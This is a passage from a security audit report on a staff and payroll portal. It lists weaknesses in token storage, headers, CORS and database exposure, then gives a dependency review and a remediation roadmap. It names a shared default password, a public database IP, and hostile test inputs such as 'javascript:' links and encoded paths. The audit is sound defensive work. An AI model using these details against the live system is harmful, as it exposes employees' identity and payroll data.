| **Location** | `server/src/app.js` (no `helmet`, `x-powered-by` not disabled); `client/vite.config.js` / `client/index.html` (no CSP / frame-ancestors) |
| **Description** | No `Content-Security-Policy`, `X-Frame-Options`/`frame-ancestors`, `X-Content-Type-Options`, `Referrer-Policy`, or HSTS. A CSP would have contained H-3, and `nosniff` + `attachment` would contain M-3. |
| **Evidence** | `grep helmet\|X-Frame` over `server/src` → no results. |
| **Attack Scenario** | The portal can be framed for click-jacking. The `Referrer` header can leak `?token=` from the reset page to third-party resources. |
| **Impact** | Defence-in-depth gap. |
| **Likelihood** | LOW |
| **Recommended Fix** | `app.disable('x-powered-by'); app.use(helmet())`. Set CSP and `frame-ancestors 'none'` on the client's web server (Nginx or similar). |
| **Status** | CONFIRMED (for the code in this repo; a proxy might add headers) |

### L-5. Token storage and revocation

| Field | Description |
|---|---|
| **Vulnerability** | Session management weakness |
| **Severity** | LOW |
| **Location** | `client/src/api/axios.js:54-56,117-121`; `client/src/context/AuthContext.jsx`; `server/src/services/auth.service.js:100-124` |
| **Description** | Access and 7-day refresh tokens are kept in `localStorage`, where any XSS can read them (H-3). There is no server-side refresh-token store, so logout cannot revoke them; only a password change does (via `pv`). Refresh tokens without a `pv` claim are accepted unconditionally (`if (decoded.pv && ...)`). |
| **Evidence** | `localStorage.setItem('refreshToken', nextRefreshToken)`; the server has no logout or revocation endpoint. |
| **Attack Scenario** | A refresh token stolen once (via XSS, a shared PC or a leaked HAR file) gives 7 days of rolling access. |
| **Impact** | Longer-lived session hijacks. |
| **Likelihood** | LOW |
| **Recommended Fix** | Move the refresh token to an `HttpOnly; Secure; SameSite=Strict` cookie. Store a refresh-token id (jti) server-side with rotation and reuse detection, and add a logout endpoint that revokes it. Treat a missing `pv` as invalid. |
| **Status** | CONFIRMED |

### L-6. Per-request MySQL pool creation

| Field | Description |
|---|---|
| **Vulnerability** | Resource exhaustion |
| **Severity** | LOW |
| **Location** | `server/src/services/biometric.service.js:52,147,326,398,614,842` |
| **Description** | Every biometric call does `mysql.createPool(SECONDARY_DB)` and then `end()`. Parallel requests from any logged-in user (M-1) open many TCP connections and handshakes to the biometric server. |
| **Evidence** | `const mysqlPool = mysql.createPool(SECONDARY_DB); const conn = await mysqlPool.getConnection();` inside each function. |
| **Attack Scenario** | 200 concurrent `GET /api/biometric/muster` requests exhaust MySQL `max_connections`, and the attendance device sync fails. |
| **Impact** | DoS of the biometric database. |
| **Likelihood** | LOW |
| **Recommended Fix** | Create one module-level pool and reuse it. Combine with M-1 role checks and rate limiting. |
| **Status** | CONFIRMED |

### I-1. Permissive development CORS

| Field | Description |
|---|---|
| **Vulnerability** | CORS configuration |
| **Severity** | INFORMATIONAL |
| **Location** | `server/src/app.js:25-45`; `server/.env` `NODE_ENV=development` |
| **Description** | When `NODE_ENV !== 'production'`, any `http(s)` origin on 10/8, 172.16/12, 192.168/16 or 127.0.0.1 is allowed. Requests with no `Origin` header are always allowed. Because auth is a bearer header (not cookies), this does not by itself allow cross-site attacks, but it widens what any page on the LAN can call. |
| **Evidence** | `if (nodeEnv !== 'production' && privateNetworkOriginPattern.test(origin)) callback(null, true);` |
| **Attack Scenario** | n/a on its own. |
| **Impact** | Low. |
| **Likelihood** | LOW |
| **Recommended Fix** | Make sure production runs with `NODE_ENV=production` and an explicit `CORS_ORIGIN`. Also set `CLIENT_URL` (currently missing, so reset links point to `http://localhost:3003`). |
| **Status** | CONFIRMED |

### I-2. Biometric MySQL reached over public IP

| Field | Description |
|---|---|
| **Vulnerability** | Network exposure of a database |
| **Severity** | INFORMATIONAL |
| **Location** | `docs/BIOMETRIC_TROUBLESHOOTING.md:125-128`; `server/src/services/biometric.service.js:8-17` |
| **Description** | The docs instruct connecting to MySQL at a public IP on port 3306, with no TLS options in the `mysql2` config. If that port is open to the internet, the database credentials travel in a weakly protected handshake and the server is open to brute force. The code also falls back to `root` with an empty password when env vars are missing. |
| **Evidence** | `DB_SECONDARY_HOST=210.212.207.11`, `DB_SECONDARY_PORT=3306`; `user: process.env.DB_SECONDARY_USERNAME \|\| 'root'`. |
| **Attack Scenario** | Depends on the firewall. Not verifiable from code. |
| **Impact** | Possible exposure of biometric data. |
| **Likelihood** | Unknown |
| **Recommended Fix** | Firewall 3306 to the app server's IP only, or tunnel it (VPN/SSH). Enable `ssl` in the `mysql2` config, use a least-privilege read-only user, and remove the `root` fallback. |
| **Status** | POTENTIAL |

---

## Quick Wins (small changes, large risk reduction)

1. **C-1:** make `checkEmail` return `{ exists: boolean }` and guard it with `requireEstb`. (~5 lines)
2. **H-1:** remove or disable `POST /api/auth/register` (and the `/register` client route). (~2 lines). This alone shrinks C-2, C-3, H-2 and M-1 to insider-only.
3. **H-2:** add `roleMiddleware('Super Admin','super-admin','admin')` to coordinator POST/PUT/DELETE. (~3 lines)
4. **C-3:** check `req.params.id` instead of `req.path` (`router.param('id', ...)`), and route `getstaffpay_list` through `requireEstb`. (~20 lines)
5. **M-4:** reject non-`active` users in `login()` / `refreshSession()`. (~4 lines)
6. **M-5:** replace `Password@123` with a random one-time password. (~3 lines)
7. **H-3:** allow only `http(s)` links on the server and add a client-side `safeHref()`. (~15 lines)
8. **L-2:** hide messages for 5xx errors. (~1 line)

---

## Dependency Review

Command: `npm audit --omit=dev` at the workspace root (covers `server` and `client`). **28 vulnerabilities: 2 critical, 9 high, 17 moderate.**

| Package | Severity | Relevance to this app | Fix |
|---|---|---|---|
| `proxy-addr` (via express) | CRITICAL | IP spoofing with IPv4-mapped IPv6 trust subnets. Only matters if `trust proxy` is configured (it isn't today, but it will be once rate limiting is added). | `npm audit fix` (update express deps) |
| `tar` (transitive) | CRITICAL | File smuggling / crash. Not used directly by app code for untrusted input. | `npm audit fix` |
| `adm-zip` ≤0.6.0 | HIGH | **Directly relevant**: parses Establishment-uploaded ZIPs in Form 16 bulk upload (4 GB allocation DoS; symlink overwrite advisory, although the app only calls `getData()` in memory). | Upgrade to `adm-zip@0.6.1` |
| `xlsx` 0.18.5 | HIGH | **Directly relevant**: `XLSX.read()` on uploaded spreadsheets in `fastrack_course.controller.js:160` (prototype pollution, ReDoS). **No fix on npm.** | Switch to the SheetJS CDN build (≥0.20.2) or to `exceljs` for reading |
| `nodemailer` ≤10.1.3 | HIGH | Used for reset and notification emails (SMTP command injection via `envelope.size`; domain interpretation issue). | Upgrade to `nodemailer@10.3.1+` (major version; test SMTP flows) |
| `body-parser` (via express) | HIGH | DoS issues in JSON parsing on every request. | `npm audit fix` |
| `axios` 1.16.1 (client) | HIGH | Prototype-pollution gadgets. | Upgrade axios ≥1.19.1 |
| `follow-redirects`, `form-data`, `undici`, `brace-expansion` | HIGH | Transitive. | `npm audit fix` |
| `react-router(-dom)` 6.x | MODERATE | Open-redirect advisories. The app's own `?next=` handling is already restricted to same-site paths (`Login.jsx:9`). | Upgrade to the patched 6.x/7.x |
| `mysql2` ≤3.23.0 | MODERATE | Decompression-bomb DoS (only if protocol compression is enabled). | Upgrade |
| `qs`, `moment`, `uuid`, `node-cron`, `exceljs` chain, `sequelize` | MODERATE | Transitive or unused (`sequelize` is a dependency but no code uses it). | `npm audit fix`; remove `sequelize` from all three `package.json` files |

Also note: `multer` is pinned to `1.4.5-lts.2`. The 1.x line is no longer maintained, and multer 2.x fixed several DoS issues (malformed multipart / stream handling). `npm audit` did not flag it in this run, so treat this as POTENTIAL and plan an upgrade to `multer@2`.

---

## Things checked and found sound

- **SQL injection:** every query uses `$n` placeholders. Dynamic identifiers (table names, `ORDER BY`, UPDATE column lists) come from code-side allowlists (`research.model.js` resource map, `UPDATABLE_COLUMNS` in `AssociateProfessor.model.js` / `Professor.model.js`). MySQL table names are built from `Number()`-coerced month/year. No injection found.
- **Mass assignment of role:** `register()` hard-codes `role: 'user'`, and there is a test for it.
- **Tickets:** view, edit, delete and reply enforce owner-or-admin. Status changes are admin-only.
- **Leave calendar:** applications, PDF, yearwise and alternates use `isSelfOrPrivileged` / `isStaffOwnerOrPrivileged`.
- **Research / professional activity:** updates and deletes are scoped by `staff_id` ownership (`findOwnedAttendee`, etc.).
- **HOD / Egov / Dean R&D / Exam section / Principal / Super Admin modules:** role middleware on every route, and HOD/Egov queries are scoped to the caller's department.
- **Impersonation:** start is Super Admin-only. The impersonator context is carried in the signed token.
- **Open redirect:** the login `?next=` is restricted to same-site paths.
- **Secrets in git:** `server/.env` is git-ignored and absent from all history. The DB dump `gitofficeDB-PG.sql` is schema-only. The seed admin hash doesn't match common passwords.
- **No `dangerouslySetInnerHTML` / `innerHTML`** in the client. Email templates escape user values where they include other users' data (`escapeHtml`). The Form 16 issue email echoes archive filenames unescaped, but only to the uploader themselves (informational).

---

## Overall Risk Rating: **CRITICAL**

Anyone who can reach the API can create an account and then obtain password hashes, every employee's PAN/Aadhaar, and everyone's payroll and tax data. Account takeover of default-password accounts follows directly. Once the Quick Wins (especially C-1, H-1, C-3 and H-2) are fixed, the rating would fall to roughly **MEDIUM**, dominated by M-2/M-3 (file handling) and the missing rate limits.

---

## Remediation Roadmap

| Phase | Items | Notes |
|---|---|---|
| **1. Immediate (same day)** | C-1, H-1, H-2, C-3 | Then rotate JWT secrets (L-1) to invalidate any tokens already obtained this way. Review `users` for unexpected self-registered accounts and the server logs for `/checkemailid` and `%3` paths under `/api/staff`. |
| **2. This week** | C-2 (directory projection), M-5, M-4, M-6, H-3, M-1 | Force password changes for accounts still on `Password@123`. |
| **3. Next sprint** | M-2, M-3, M-7, M-8, L-2, L-3 | Authenticated download route for Form 16 and tickets; strict upload allowlist; path containment helper reused across upload code. |
| **4. Hardening** | L-4, L-5, L-6, I-1, I-2, dependency upgrades (`adm-zip`, `xlsx`, `nodemailer`, `axios`, `multer@2`, `npm audit fix`) | Add helmet/CSP, HttpOnly refresh cookie with rotation, single MySQL pool, firewall the biometric DB. |
| **5. Regression safety** | Extend `server/tests/auth-access.test.js` | Cases: encoded ids, uppercase paths, trailing slashes, `user` role denied on `/api/staff*`, `/api/biometric/*`, `/api/coordinators` writes; `checkemailid` never returns `password`; inactive login rejected; `javascript:` links rejected. |

---

*No source code was modified during this audit. Phase 4 (remediation) will begin only after the findings above are reviewed and approved.*
